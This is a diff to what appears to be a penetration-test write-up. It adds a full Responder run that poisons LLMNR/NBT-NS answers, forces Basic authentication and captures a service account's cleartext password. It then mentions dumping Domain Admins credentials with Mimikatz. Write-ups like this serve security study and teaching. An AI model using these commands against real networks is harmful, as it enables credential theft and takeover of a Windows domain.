@@ -94,7 +94,7 @@ At this time, I knew that It was close. I edited the file like I could force an 
 And the *Responder* command line is :
 
 ```
-root@kali:~/Tools/responder# python Responder.py -h
+root@kali:~/Tools/responder# python Responder.py -I eth0 --basic
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
@@ -106,11 +106,53 @@ root@kali:~/Tools/responder# python Responder.py -h
   Original work by Laurent Gaffie (lgaffie@trustwave.com)
   To kill this script hit CRTL-C
 ...
-  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
-...
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
 
-root@kali:~/Tools/responder# python Responder.py -I eth0 --basic
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [ON]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [ON]
+    Force LM downgrade         [OFF]
+    Fingerprint hosts          [OFF]
+
+[+] Generic Options:
+    Responder NIC              [eth0]
+    Responder IP               [192.168.169.140]
+    Challenge set              [1122334455667788]
+
+
+[+] Listening for events...
+[*] [LLMNR]  Poisoned answer sent to 192.168.169.141 for name fuckingrandomserver
+
+[HTTP] Basic Client   : 192.168.169.141
+[HTTP] Basic Username : McAfeeService
+[HTTP] Basic Password : *\cool_its_a_strong_password/*
 ```
+
+OMG, we got it ! Now, I have privesc :) I could logon on the Domain Controler and dump `*Domain Admins*` credentials using *Mimikatz*.
 
 Ty !
 
